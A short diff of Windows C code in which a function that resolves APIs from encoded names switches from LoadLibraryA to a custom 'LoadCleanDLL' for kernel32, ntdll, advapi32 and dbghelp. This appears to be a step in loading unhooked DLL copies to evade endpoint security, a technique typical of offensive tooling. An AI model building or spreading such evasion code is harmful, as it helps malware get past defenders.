@@ -33,10 +33,10 @@ static BOOL ResolveApiFromDll(HMODULE hMod, const unsigned char* enc, size_t len
 
 // resolve all required APIs
 BOOL ResolveAllApis(void) {
-    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
-    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
-    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
-    HMODULE hDbghelp = LoadLibraryA("dbghelp.dll");
+    HMODULE hKernel32 = LoadCleanDLL("kernel32.dll");
+    HMODULE hNtdll = LoadCleanDLL("ntdll.dll");
+    HMODULE hAdvapi32 = LoadCleanDLL("advapi32.dll");
+    HMODULE hDbghelp = LoadCleanDLL("dbghelp.dll");
 
     if (!hKernel32 || !hNtdll || !hAdvapi32 || !hDbghelp) {
         log_error("Failed to load required DLLs.");
